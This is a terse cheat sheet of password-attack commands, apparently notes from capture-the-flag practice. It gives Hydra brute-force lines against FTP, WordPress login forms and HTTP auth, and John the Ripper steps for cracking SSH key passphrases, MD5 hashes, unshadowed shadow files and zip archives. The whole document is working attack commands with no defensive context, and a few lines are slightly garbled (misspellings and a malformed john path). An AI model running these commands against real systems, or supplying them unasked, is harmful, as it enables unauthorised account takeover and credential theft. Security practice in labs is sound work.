#Password cracking using list with popular passwords
hydra -l user -P passlist.txt ftp://192.168.0.1
#Finding valid username
hydra -L file+name -p test target http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 30
#Crak password for username
hydra -l username -P fsocity.dic 10.10.28.2 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 30
#Simple authentication
hydra -l username -P /usr/share/wordlists/rockyou.txt -f 10.10.238.243 http-get /protected

#Cracking passphrase for private key

#Convert key to format recognized by JohnTheRipper
ssh2john.py /path/to/key > hash.txt

#Crack passphrase using wordlist
/run/john/ hash.txt --wordlist=/path

#Identify hash
wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
python3 hash-id.py

#Find list format for john
john --list=formats | grep -iF "md5"
#Execute john with defined format
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt
#Unashadow
unshadow local_passwd local_shadow > unshadowed.txt
#Single mode
john --single --format=raw-md5 hash07.txt
#zip files
zip2john [options] [zip file] > [output file]